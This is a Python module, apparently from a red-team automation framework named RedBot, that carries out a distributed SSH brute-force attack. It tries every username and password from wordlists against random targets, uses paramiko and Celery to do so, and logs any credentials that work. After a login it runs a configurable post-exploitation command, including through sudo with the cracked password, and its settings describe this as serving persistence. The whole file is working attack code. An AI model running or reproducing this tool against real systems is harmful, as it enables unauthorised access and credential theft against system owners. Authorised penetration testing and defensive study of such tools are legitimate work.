import socket
from typing import List, Any

import paramiko
from celery import group
from celery.result import GroupResult

from redbot.core.async import celery
from redbot.core.utils import get_file
from redbot.modules import Attack


class SSHAttack(Attack):
    name = "ssh_attack"
    settings = {
        'ports': {
            'name': 'Target Ports',
            'default': '22',
            'description': 'Comma-separated list of ports to target.',
        },
        'userlist': {
            'name': 'User List',
            'default': 'users.txt',
            'description': 'Path to a wordlist containing one username per line. Accepts file paths within the '
                           'RedBot "files" directory, or a valid HTTP(S) URL.'
        },
        'passlist': {
            'name': 'Password List',
            'default': 'pass.txt',
            'description': 'Path to a wordlist containing one username per line. Accepts file paths within the '
                           'RedBot "files" directory, or a valid HTTP(S) URL.'
        },
        'command': {
            'name': 'SSH Command',
            'default': 'ls /',
            'description': 'Command to run if access is gained, e.g. for post-exploitation, establishing persistence '
                           'etc. Supports sudo commands. Must exit when done. '
        }
    }

    @classmethod
    def run_attack(cls) -> (GroupResult, List[str]):
        cls.log("Starting SSH attack.")
        with open(get_file(cls.get_setting('userlist'))) as ul, open(get_file(cls.get_setting('passlist'))) as pl:
            users = ul.readlines()
            passwords = pl.readlines()
        targets = cls.get_random_targets()
        g = cls.attack_all(attacks=(ssh_brute_force,), targets=targets, users=users, passwords=passwords)
        return g, targets


cls = SSHAttack


@celery.task
def ssh_brute_force(host: str, port: int = 22, users: List[str] = [], passwords: List[str] = []):
    for user in users:
        user = user[:-1]
        for password in passwords:
            password = password[:-1]
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(hostname=host, port=port, username=user, password=password, timeout=30)

                command = SSHAttack.get_setting('command')
                if command:
                    if command.startswith('sudo'):
                        session = ssh.get_transport().open_session()
                        session.set_combine_stderr(True)
                        session.get_pty()
                        session.exec_command("sudo -k " + command[4:])
                        stdin = session.makefile('wb', -1)
                        # stdout = session.makefile('rb', -1) # could be used to check the output of the command
                        stdin.write(password + '\n')
                        stdin.flush()
                        if session.recv_exit_status():
                            raise Exception("Unable to sudo.")
                    else:
                        ssh.exec_command(command, timeout=30)

            except paramiko.AuthenticationException:
                pass
            except socket.error:
                return  # TODO: handle
            else:
                cls.log("SSH successful login to {} with username: '{}', password: '{}'".format(host, user, password),
                        "success")
                return
    cls.log("SSH brute force on '{}' completed, no result.".format(host), "info")
